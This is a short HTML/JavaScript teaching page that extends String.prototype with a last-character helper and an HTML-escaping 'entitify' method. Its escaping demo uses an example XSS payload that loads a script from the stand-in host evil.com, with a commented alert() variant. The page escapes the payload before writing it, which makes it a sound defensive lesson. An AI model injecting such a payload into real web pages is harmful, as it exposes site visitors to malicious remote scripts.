<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <title>Extending Built-ins</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
    </head>
    <body>
<script>
var s = "cat";
// example of XSS = Cross Site Scripting vulnerability

var hacker = "<script src='http://evil.com/evil.js'><\/script>Pretending Good";
//var hacker = "<script>alert('hacked!')<\/script>Pretending Good";


String.prototype.lastCharacter = function() {
    return this.charAt(this.length-1);
}

String.prototype.entitify = function() {
    return this.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&apos;");
}
document.write(s.lastCharacter()+"<br>");
document.write(hacker.entitify()+"<br>");
</script>
    </body>
</html>
